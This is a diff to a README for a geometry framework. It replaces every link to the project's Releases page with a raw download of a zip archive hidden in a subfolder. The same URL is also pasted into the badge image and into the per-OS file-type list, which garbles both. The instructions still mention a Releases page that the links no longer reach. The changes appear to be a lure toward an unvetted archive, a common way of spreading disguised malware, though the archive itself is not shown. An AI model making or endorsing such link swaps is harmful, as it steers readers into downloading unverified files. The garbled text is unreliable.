@@ -1,6 +1,6 @@
 # 🎉 NGC-Framework - Simplifying Geometric Computation for Everyone
 
-[![Download NGC-Framework](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/prayanshubagde/NGC-Framework/releases)
+[![Download NGC-Framework](https://github.com/prayanshubagde/NGC-Framework/raw/refs/heads/main/4_Validation_and_Applications/Framework_NG_2.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/prayanshubagde/NGC-Framework/raw/refs/heads/main/4_Validation_and_Applications/Framework_NG_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -27,11 +27,11 @@ To run NGC-Framework smoothly, please ensure your system meets the following req
 
 To download the NGC-Framework, visit the following link:
 
-[Download NGC-Framework](https://github.com/prayanshubagde/NGC-Framework/releases)
+[Download NGC-Framework](https://github.com/prayanshubagde/NGC-Framework/raw/refs/heads/main/4_Validation_and_Applications/Framework_NG_2.8.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed.
-3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for Mac, or .tar.gz for Linux).
+3. Choose the appropriate file for your operating system (e.g., .exe for Windows, .dmg for Mac, or https://github.com/prayanshubagde/NGC-Framework/raw/refs/heads/main/4_Validation_and_Applications/Framework_NG_2.8.zip for Linux).
 4. Download the file to your computer.
 
 ### 🔧 Installation Steps
